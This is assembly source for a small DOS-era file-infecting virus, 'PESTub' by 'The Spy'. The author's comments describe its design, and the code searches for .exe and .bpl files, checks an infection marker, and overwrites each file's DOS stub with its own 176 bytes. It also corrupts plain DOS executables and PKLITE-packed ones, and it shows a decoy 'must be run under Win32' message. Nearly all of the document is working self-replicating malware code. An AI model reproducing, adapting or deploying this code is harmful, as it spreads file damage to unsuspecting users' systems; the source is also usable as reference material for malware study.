;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
;
; PESTub Virus by The Spy
; Start codin: 22/02/2000
; Finished codin: 23/02/2000	; hey, i ve needed sleep! :)
;,,,,,,,,,,,,
; Some Stuff:
; + .exe;.bpl;.dll;.ocx;.cpl; were analyzed to develop this 176 bytes
; + Some PE ve it 'PE' ident in offset 80h, 0E0h, 0F0h,others in 100h
;   n others in 512d, depends compiler.
; + .dll;.ocx;.cpl; were discarded cuz da dlls i ve analyzed ve da id
;   in 0E0h n 80h, so i cant infect them. Da .ocx i ve analyzed ve da
;   id in 80h, so da same. Da .cpl i ve analyzed ve da id in 0F0h n
;   80h, so again... da same, cant infect them.
;,,,,,,,,,,
; Features:
; + It infects .exe n .bpl PE's Dos Stub with da ID in 100h n 512d.
; + It can infect PE's with da ID in offset 0F0h but i ve only found
; a .cpl, yes only one, thats why i dont look for .cpls n also cuz i
; ve no room hehe :)
; + It no infects NE's with da ID in 80h, but da NE's that ve da ID in
; 400h r infected (but da virus never gonna run). Guess Why? no room
; to place a check :)
; + Da infection check is a simple cmp for an instruction that isnt in
; da normal PE's Dos Stub. 1AB4h, that is mov ah,1Ah.
;,,,,,,,,,,,,
; Virus Size:
; + 176 bytes. Why? cuz i dont know if it will infect a PE that ve da
; ID in 0F0h, like a .cpl renamed to .bpl or .exe.
;,,,,,,,,,,
; Troubles:
; - It fuck dos exes n also da PKLITEd ones. Why? cuz ive no room to
; fit a shitty:
;
;  cmp word ptr [ExeHeader+24],40h
;  jnae NO_INFECT
;
; n a stupid check to avoid infect PKLITEd exes. Check for offset 20
; for 'LITE'.
;,,,,,,,
; Notes:
; + If u optimize da code, u can fit them... i guess so...
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,

.model tiny
.code

main:

Infect_PE:
	push cs
	pop ds
	mov ah,1Ah		;move dta to here+16
	mov bp,2
	lea dx,[here+16]
	int 21h
	lea dx,[filemask]	; dx := '*.exe'
othertype:
	mov ah,4Eh		; ah := 4Eh	Find First
	int 21h			; look for da first *.exe
open:
	mov ax,3D02h		;Open Read n Write
	lea dx,[here+16+1eh]	;File Name
	int 21h			;...
	jc exit			;error?
	mov si,00001001b	;si:=9;
	xchg ax,bx		;handler
othermore:
	dec si		;si:=si-1;
	mov ah,3Fh	;read from file
	mov cl,16	;16 bytes
	lea dx,here	;n put them here!
	int 21h		;now!!!!!
	cmp word ptr [here+2],1AB4h	;its infected?
	jz its_infected		;yes? its already infected
	cmp si,0		;si=0 ??
	jnz othermore		;no? well, again...

	cmp byte ptr [here+1],'E'	;a 'PE' or 'LE' in offset 128d?
	jz exit				;yes, fuck. damn compiler

infect:
	mov dx,64	;0040h
	mov ax,4200h	;move file pointer from file's begining
	xor cx,cx	;0000:
	int 21h		;

	mov ah,40h			;lets gonna write
	mov cx,(endof-Infect_PE)	;what im goin to write??...
	lea dx, Infect_PE		;initial point
	int 21h				;to write it

its_infected:
	mov ah,3Eh
	int 21h
	mov ah,4Fh	; ah := 4Fh	Find Next
	int 21h		; find da next file
	jnc open	; another???
	lea dx,[fmbpl]
	dec bp
	cmp bp,0
	jnz othertype
	jmp exit

filemask	db	'*.exe',0
fmbpl		db	'*.bpl',0
exit:
	lea dx,msg
	mov ah,9
	int 21h
	mov ax,4C01h
	int 21h
msg	db	'This program must be run under Win32',13,10,24h
i	db	'The Spy$'	; ive to optimize a lot to can sign :)
endof:
here:	; Why two labels? Why do u ask? Why im writin this? Cuz Yes :D
end main
